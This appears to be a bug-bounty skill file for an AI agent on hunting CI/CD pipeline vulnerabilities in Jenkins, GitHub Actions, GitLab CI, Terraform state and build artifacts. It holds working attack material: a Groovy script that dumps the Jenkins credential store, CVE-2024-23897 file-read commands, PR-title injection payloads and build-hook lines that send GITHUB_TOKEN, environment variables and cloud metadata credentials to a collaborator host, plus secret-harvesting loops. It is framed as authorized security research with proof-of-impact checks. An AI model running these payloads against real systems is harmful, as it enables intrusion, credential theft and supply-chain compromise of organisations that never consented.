---
name: hunt-cicd
description: "Hunt CI/CD pipeline vulnerabilities — GitHub Actions workflow injection (pull_request_target Pwnrequest + ${{ }}-into-shell), self-hosted runner poisoning, OIDC trust-policy abuse, Jenkins script-console RCE and CVE-2024-23897 file read, GitLab CI runner-token registration, Terraform state file leakage, artifact/log secret leakage, pipeline env-var disclosure. Use when target has a public GitHub/GitLab org, exposed CI dashboards (Jenkins/TeamCity/Drone/Argo), or build artifacts/images are reachable."
metadata:
  sources: hackerone_public, github_security_lab, cve_database, portswigger_research
  report_count: 18
---

# HUNT-CICD — CI/CD Pipeline Security

## Crown Jewel Targets

Jenkins `/script` console reachable = immediate RCE. A GitHub Actions `pull_request_target` (or `workflow_run`) workflow that checks out the **PR head ref** and references untrusted `${{ github.event.* }}` in a shell `run:` = "Pwnrequest" → secret exfil from a fork PR with zero approval.

**Highest-value findings:**
- **Jenkins Script Console** — Groovy execution → full RCE → dump the credential store
- **Jenkins CLI file read (CVE-2024-23897)** — pre-auth `@/etc/passwd` arg expansion → read `secret.key`/`credentials.xml` → forge admin → RCE
- **GitHub Actions `pull_request_target` injection (Pwnrequest)** — fork PR controls `${{ }}` inside a privileged shell step → exfil `GITHUB_TOKEN` (often `contents:write`) and org secrets
- **Self-hosted runner poisoning** — non-ephemeral runner on a public repo executes a fork PR's build → attacker code runs on the runner host → persistence + secret theft
- **OIDC trust-policy abuse** — over-broad `sub` claim wildcard in an AWS IAM role trust policy → any workflow in the org assumes a privileged cloud role
- **Terraform state leakage** — `*.tfstate` in public S3/GCS/Blob → plaintext infra creds, DB passwords, private keys
- **Runner token / artifact / log leakage** — register attacker runner, or harvest secrets printed before `::add-mask::`

---

## "It-Didn't-Happen-Without-Proof" Gate (Read First)

CI/CD findings are over-reported because dashboards *look* exploitable. Before claiming anything:

1. **A login page is not an RCE.** A reachable `/script` URL that returns a Jenkins login or `403` is **not** an unauthenticated script console. Only an actual `scriptText` POST returning your command's output counts.
2. **A `pull_request_target` workflow is not automatically injectable.** It is only exploitable if untrusted data flows into an execution sink. Confirm the data flow (see FP section) before you ever open a PR.
3. **Blind injection requires OOB.** If the vulnerable step has no output you can read, you MUST confirm via Burp Collaborator / interactsh — a unique per-sink subdomain that the runner calls out to. A workflow that "ran green" is not proof your code executed.
4. **A `.tfstate` HTTP 200 is not cred exposure until you parse it.** Diff against a baseline (see FP section) — many `tfstate` files contain only resource IDs and outputs, no secrets.

---

## Phase 1 — Jenkins: Detection, Script Console, CVE-2024-23897

```bash
# Fingerprint — the X-Jenkins header leaks the exact version (drives CVE selection)
curl -sI "https://$TARGET/" | grep -iE "x-jenkins|x-hudson"
curl -sI "https://$TARGET/login" | grep -i "x-jenkins-session"
for p in /script /jenkins/script /ci/script /scriptText /jenkins/scriptText; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$p")
  echo "$p -> $code"   # 200 on /script == anon script console; 403/401 == auth required (NOT a finding alone)
done
```

**Unauthenticated script console → RCE (only if the POST returns output):**
```bash
# This must return uid=...(jenkins). If it returns the Jenkins login HTML or a
# Crowd/SSO error page, the console is NOT anon-accessible — do not report it.
curl -s -X POST "https://$TARGET/scriptText" \
  --data-urlencode 'script=println "id".execute().text'
```

**Dump the credential store** (Groovy decrypts secrets the UI masks):
```groovy
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
import org.jenkinsci.plugins.plaincredentials.StringCredentials
CredentialsProvider.lookupCredentials(StandardUsernamePasswordCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.username} :: ${it.password}"
}
CredentialsProvider.lookupCredentials(StringCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.secret}"
}
```

**CVE-2024-23897 — pre-auth arbitrary file read via Jenkins CLI** (args4j `@`-file expansion; affects ≤2.441 / LTS ≤2.426.2). With anonymous read, this escalates to RCE by reading `secret.key` + `master.key` to decrypt `credentials.xml`, or reading a user's `config.xml` API token:
```bash
# Download the matching jenkins-cli.jar from /jnlpJars/jenkins-cli.jar first.
java -jar jenkins-cli.jar -s "https://$TARGET/" -http connect-node "@/etc/passwd"
# The file content is echoed back in the error. Then target:
#   @/var/lib/jenkins/secret.key  @/var/lib/jenkins/secrets/master.key
#   @/var/lib/jenkins/credentials.xml
```
Validation: the response must contain real file content (root:x:0:0). A generic "no such agent" with no leaked line means the instance is patched or the path is wrong — not a finding.

---

## Phase 2 — GitHub Actions: Pwnrequest, `${{ }}`-into-Shell, Runner Poisoning, OIDC

### The core distinction (this is where 90% of false PoCs die)

There are **two** sink classes — they need different payloads:

- **`${{ }}` template expansion into a shell `run:`** — the expression is substituted into the script *before* the shell runs, so a newline/backtick/`$(...)` in the untrusted field becomes literal shell. This is the classic injection.
- **Environment variable read inside the shell** — `GITHUB_TOKEN`, `secrets.X`, and any `env:`-mapped value are **shell variables whose value IS the string**. To exfiltrate them you use `echo`/`printenv`, **never** `cat $VAR` (that tries to open a file *named* by the token and prints nothing).

```yaml
# VULNERABLE workflow (untrusted title flows into the script text):
on: pull_request_target            # runs with write token + secrets, on fork PRs
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # checks out ATTACKER code
      - run: echo "Building PR ${{ github.event.pull_request.title }}"   # ← ${{ }} INJECTION
```

**Attack via the `${{ }}` sink** — set the PR **title** (or branch name, body, label, commit message — all attacker-controlled) to break out of the echo and run your own commands. Exfiltrate the token with `printenv`, not `cat`:
```
PR title:  a"; printenv GITHUB_TOKEN | base64 | tr -d '\n' | { read T; curl "https://x.<COLLAB>/?t=$T"; }; echo "
```
For a multi-line YAML `run:`, a newline injection is cleaner:
```
PR title:  foo\n      curl https://x.<COLLAB>/?d=$(printenv | base64 -w0)
```

**Attack via a poisoned checkout (no `${{ }}` needed)** — if `pull_request_target` checks out the PR head and then runs a build script / installs deps from the checked-out tree (`make`, `npm ci` with a malicious `preinstall`, a Makefile, a `.github/` action in the PR), the *runner executes attacker code directly*. Drop into any build hook:
```bash
# in attacker's PR, e.g. package.json preinstall or Makefile:
curl -s "https://x.<COLLAB>/?env=$(printenv | base64 -w0)"
cat /proc/self/environ | tr '\0' '\n' | base64 -w0   # captures secrets injected as env
```

**Self-hosted runner poisoning** — if `runs-on: self-hosted` (or a custom label) on a **public** repo with `pull_request`/`pull_request_target`, a fork PR's job runs on the org's own host. Non-ephemeral runners persist tools/creds between jobs. Confirm by reading the runner's identity and metadata from inside the job:
```bash
- run: |
    whoami; hostname; id
    curl -s "https://x.<COLLAB>/?h=$(hostname)&u=$(whoami)"
    curl -s "https://x.<COLLAB>/imds=$(curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 -w0)"
```

**OIDC trust-policy abuse** — workflows that `configure-aws-credentials` via OIDC assume an IAM role. A trust policy whose `token.actions.githubusercontent.com:sub` condition is missing or uses a loose wildcard (`repo:ORG/*:*`) lets **any** workflow in the org (including a malicious one you can merge, or a fork on a misconfigured trigger) assume that role. Inspect the role:
```bash
aws iam get-role --role-name <RoleName> --query 'Role.AssumeRolePolicyDocument'
# Red flag: StringLike on sub with "repo:ORG/*" or no sub condition at all (only aud).
```
Then prove it: from a workflow you control in-org, assume the role and run `aws sts get-caller-identity` returning the privileged role ARN.

### Recon

```bash
# Enumerate org workflows that use the dangerous triggers
gh api graphql -f query='{organization(login:"ORG"){repositories(first:100){nodes{name}}}}' \
  | jq -r '.data.organization.repositories.nodes[].name' | while read r; do
  for wf in $(gh api "repos/ORG/$r/contents/.github/workflows" 2>/dev/null | jq -r '.[]?.name'); do
    body=$(gh api "repos/ORG/$r/contents/.github/workflows/$wf" 2>/dev/null | jq -r '.content' | base64 -d)
    echo "$body" | grep -Eq 'pull_request_target|workflow_run' && \
      echo "$body" | grep -Eq '\$\{\{ *github\.event|self-hosted|head\.ref|head\.sha' && \
      echo "CANDIDATE: ORG/$r/$wf"
  done
done
```
Triage candidates with the static analyzer before opening any PR: **actionlint** (not a `gh` extension: `brew install actionlint`, `go install github.com/rhysd/actionlint/cmd/actionlint@latest`, or a release binary) or run **zizmor** (`pip install zizmor; zizmor .github/workflows/`) which flags template-injection and dangerous-checkout patterns specifically.

---

### Actions cache poisoning
The GitHub Actions cache is not trust-isolated across branches by default: a workflow from an attacker branch/fork PR can write a cache entry (key or restore-key) that a later privileged workflow on the default branch restores, injecting attacker files (built binaries, deps, scripts) into a trusted build -> code execution in the privileged context. Check for cache actions keyed on attacker-influenced values, and whether privileged pipelines `restore-keys` a prefix an untrusted job can populate.

- **Tooling:** Adnan Khan's [Cacheract](https://github.com/AdnaneKhan/Cacheract) (Dec 2024) is cache-native persistence that rides poisoned entries into later runs. Use the write-up for the mechanics; in an engagement, prove the write with a benign marker file under an engagement-specific key, never a live implant.
- **Real case, TanStack (May 2026):** a fork PR hit a `pull_request_target` job that ran PR code; each push wrote a poisoned pnpm store via the shared `actions/cache` setup, and `release.yml` on `main` restored it under the same key, ending in malicious npm publishes. The job's `permissions:` block did not restrict cache writes ([SafeDep](https://safedep.io/tanstack-github-actions-cache-poisoning/)).
- **Platform changes:** from 2025-12-08 `pull_request_target` always runs the default branch's workflow with `GITHUB_REF` = default branch ([changelog](https://github.blog/changelog/2025-11-07-actions-pull_request_target-and-environment-branch-protections-changes/)), so its cache writes land in the scope release jobs restore. That changelog says nothing about making the cache read-only. The read-only default came later: the `cache-mode` workflow/job key (`read`, `write`, `write-only`, `none`) with `read` as the default for low-trust events such as `pull_request_target` ([changelog 2026-09-10](https://github.blog/changelog/2026-09-10-control-github-actions-cache-access-with-cache-mode/)). Today the finding is a workflow that sets `cache-mode: write` on an untrusted trigger, or another untrusted trigger that still writes the cache (verify which triggers default to `read`).

## Phase 3 — Secrets in Logs & Artifacts

```bash
# Public-repo run logs frequently contain secrets printed BEFORE ::add-mask:: took effect,
# or echoed via debug. The masker only hides exact known values — derived/base64 forms slip through.
gh api "repos/ORG/REPO/actions/runs" | jq -r '.workflow_runs[:20][].id' | while read id; do
  gh api "repos/ORG/REPO/actions/runs/$id/logs" > /tmp/r.zip 2>/dev/null && \
  unzip -o -q /tmp/r.zip -d /tmp/runlogs && \
  grep -rniE 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|-----BEGIN|eyJ[A-Za-z0-9_-]{10,}\.' /tmp/runlogs
done

# Artifacts — env dumps, .env, kubeconfig, built binaries with embedded secrets
gh api "repos/ORG/REPO/actions/artifacts" | jq -r '.artifacts[] | "\(.id) \(.name)"'
```
Note `actions/upload-artifact` does **not** redact secrets — an artifact named `env`/`debug` is a common direct leak.

**Compromised third-party action (tj-actions/changed-files, CVE-2025-30066, KEV 2025-03-18):** tags v1 to v45.0.7 were repointed to a commit that dumped runner secrets into the workflow log on 2025-03-14/15; the likely entry point was the earlier reviewdog `action-setup@v1` compromise (CVE-2025-30154, KEV 2025-03-24). In a **public** repo those logs are readable by anyone. Grep the org's workflows for `tj-actions/changed-files` or `reviewdog/action-*` and pull run logs from that window with the loop above (only repos whose log retention, 90 days by default, still covers it). Secrets printed there (double-base64 in the log) are a finding only after you prove they are still live and unrotated. The same pattern applies to any future tag-repointing compromise.

---

## Phase 4 — GitLab CI

```bash
# Runner registration token → register an attacker runner that picks up jobs (and their secrets).
# Found in config.toml (via LFI/disclosure), screenshots, /admin/runners, or leaked CI logs.
curl -s "https://$TARGET/api/v4/projects/PID/variables" -H "PRIVATE-TOKEN: $TOK"   # masked? protected?
curl -s "https://$TARGET/api/v4/runners?type=instance_type" -H "PRIVATE-TOKEN: $TOK"

# .gitlab-ci.yml review: unmasked variables, `CI_JOB_TOKEN` over-permission,
# `rules:` that run privileged jobs on MRs from forks (the GitLab analogue of pull_request_target).
curl -s "https://$TARGET/api/v4/projects/PID/repository/files/.gitlab-ci.yml/raw?ref=main"
```
A registration token alone is **not** a finding unless the instance allows that token to register a runner that will execute a target project's pipeline. Demonstrate by registering an ephemeral runner you own and capturing a job's masked variables.

**GitLab SAML SSO (ruby-saml CVE-2025-25291 / CVE-2025-25292):** REXML/Nokogiri parser differential enables signature wrapping, so anyone holding one valid IdP signature can log in as any user. Fixed in ruby-saml 1.12.4 / 1.18.0; GitLab CE/EE before **17.7.7 / 17.8.5 / 17.9.2** is affected ([CERT-EU 2025-011](https://cert.europa.eu/publications/security-advisories/2025-011/)). Detection is version plus a SAML button on `/users/sign_in`; building the wrapped assertion is Stage B, against an account you own. Mechanics: `hunt-saml`, `hunt-misc` Chain 4.

---

## Phase 5 — Terraform State Leakage

```bash
# Probe common public-bucket/path patterns (parameterize $T and $ORG)
for U in \
  "https://$ORG.s3.amazonaws.com/terraform.tfstate" \
  "https://s3.amazonaws.com/$ORG-tfstate/terraform.tfstate" \
  "https://$ORG-infra.s3.amazonaws.com/env/prod/terraform.tfstate" \
  "https://storage.googleapis.com/$ORG-tfstate/default.tfstate" \
  "https://$ORG.blob.core.windows.net/tfstate/terraform.tfstate" ; do
  code=$(curl -s -o /tmp/tf.json -w "%{http_code}" "$U")
  [ "$code" = "200" ] && echo "[+] 200 $U" && \
    jq -r '.resources[].instances[].attributes
           | to_entries[] | select(.key|test("password|secret|private_key|token|access_key";"i"))
           | "\(.key) = \(.value)"' /tmp/tf.json 2>/dev/null
done
# Also hunt state in repos / backend configs
gh search code --owner ORG "terraform.tfstate" --limit 10
gh search code --owner ORG 'backend "s3"' --limit 10
```
**False-positive filter:** a `tfstate` that lists only `id`, `arn`, `tags` is not a secret leak. Run the `jq` above and confirm at least one *live* credential (a real `password`, `private_key`, RDS master password, or non-rotated access key). Then prove impact by using that credential read-only (`aws sts get-caller-identity`, a DB connect that returns a banner) — do not just claim "creds in state."

---

## Phase 6 — Build Artifact / Image Analysis

```bash
docker pull ORG/IMAGE:latest
docker history --no-trunc ORG/IMAGE:latest | grep -iE 'ENV|ARG|secret|token|password|key'
# Layer-level scan catches secrets removed in a later layer but still present in history:
trufflehog docker --image ORG/IMAGE:latest --results=verified
```
`--results=verified` filters trufflehog to credentials it could actually authenticate — use it to drop the noise of expired/example keys before reporting.

---

## Grounded References (named cases / CVEs)

- **Pwnrequest / `pull_request_target` class** — GitHub Security Lab (Jaroslav Lobačevski), "Keeping your GitHub Actions and workflows secure: Untrusted input." The original write-up of fork-PR secret exfil and the dangerous-checkout pattern.
- **GitHub Actions workflow-command injection — CVE-2020-15228** — `set-env`/`add-path` workflow commands allowed env/PATH injection from logged output; this drove the deprecation of those commands and the move to `$GITHUB_ENV`.
- **Jenkins CLI arbitrary file read — CVE-2024-23897** — args4j `@`-prefixed file expansion (Jenkins ≤2.441 / LTS ≤2.426.2), read `secret.key`/`credentials.xml` → admin → RCE.
- **Jenkins WSO2 Oauth Plugin auth bypass — CVE-2025-47889** — plugin ≤1.0, no fix at publication ([advisory 2025-05-14](https://www.jenkins.io/security/advisory/2025-05-14/)). The "WSO2 Oauth" security realm accepts any username and password, even for users that do not exist. Impact depends on the authorization strategy: under "Logged-in users can do anything" the session gets Overall/Administer. Check the realm on the login page before claiming it.
- **tj-actions/changed-files — CVE-2025-30066** (and reviewdog `action-setup` CVE-2025-30154) — March 2025 tag-repointing compromise that printed CI secrets into public workflow logs; see Phase 3.
- **Jenkins Stapler RCE — CVE-2018-1000861** — dynamic routing reaches `groovy.lang.GroovyShell`; a staple of the unauth script-execution chain on older Jenkins.
- **PortSwigger / Liam Galvin & others** — research on GitHub Actions injection sinks (title/branch/body/label) and the `${{ }}`-into-`run` template-substitution vector; the basis of the actionlint/zizmor detection rules cited above.

(Only CVEs and cases I can attribute exactly are listed. Confirm the running version against the CVE's affected range before claiming it.)

---

## Chain Table

| CI/CD finding | Chain to | Impact |
|---|---|---|
| Jenkins anon script console | Dump credential store → cloud/DB creds → lateral | Critical |
| Jenkins CLI file read (CVE-2024-23897) | Read `secret.key`+`credentials.xml` → forge admin → RCE | Critical |
| Actions `${{ }}` injection (Pwnrequest) | `printenv GITHUB_TOKEN`/secrets → push to protected branch | Critical |
| Self-hosted runner poisoning | Code-exec on runner host → IMDS creds → persistence | Critical |
| OIDC `sub` wildcard | `AssumeRole` privileged cloud role from any org workflow | Critical |
| Terraform state w/ live creds | Infra/DB/API credential use | Critical |
| GitLab runner registration | Register runner → capture pipeline secrets | High/Critical |
| Image/log/artifact secret | Direct credential use | High |

---

## Validation Discipline (per finding, before you report)

- **Jenkins console:** the `scriptText` POST returns your `id` output (`uid=…(jenkins)`). A returned login/SSO/Crowd page = **not** anon access. Screenshot the request+response.
- **CVE-2024-23897:** response contains real `/etc/passwd` content; confirm version is in range. Patched instances return an error with no leaked line.
- **Actions injection:** confirm the data flow into a sink first (FP section). Blind step → **Collaborator callback with the runner's source IP** is mandatory. Token exfil via `printenv`/`/proc/self/environ` decoded at your endpoint — never `cat $GITHUB_TOKEN`.
- **OIDC abuse:** `aws sts get-caller-identity` from your controlled workflow returns the privileged role ARN — not just a permissive-looking trust policy.
- **Terraform state:** `jq` extraction yields ≥1 *live* secret, then a read-only auth proves it. ID/ARN-only state = no finding.
- **Runner token / image / logs:** demonstrate the secret authenticates (trufflehog `--results=verified`, or a real API call) — possession of a string is not impact.

### Common false positives to retract
- `/script` returning a login page (auth required) reported as "unauth RCE."
- `pull_request_target` present but untrusted input never reaches a sink (e.g., used only in `if:` on `github.actor`, or the workflow uses `pull_request` not `_target`).
- `${{ }}` reference that is already wrapped in an `env:` block and quoted in the shell (the recommended safe pattern) — not injectable.
- `.tfstate` 200 containing only resource metadata.
- A masked GitLab variable that is `protected` and only exposed to protected branches the attacker can't push to.
- Trufflehog "unverified" hits that are example/expired keys.

**Severity:** Jenkins console / CVE-2024-23897 / Actions secret exfil / runner poisoning / OIDC role assumption / Terraform live creds = **Critical**. Image/log/artifact secret = **High/Critical** by credential scope.
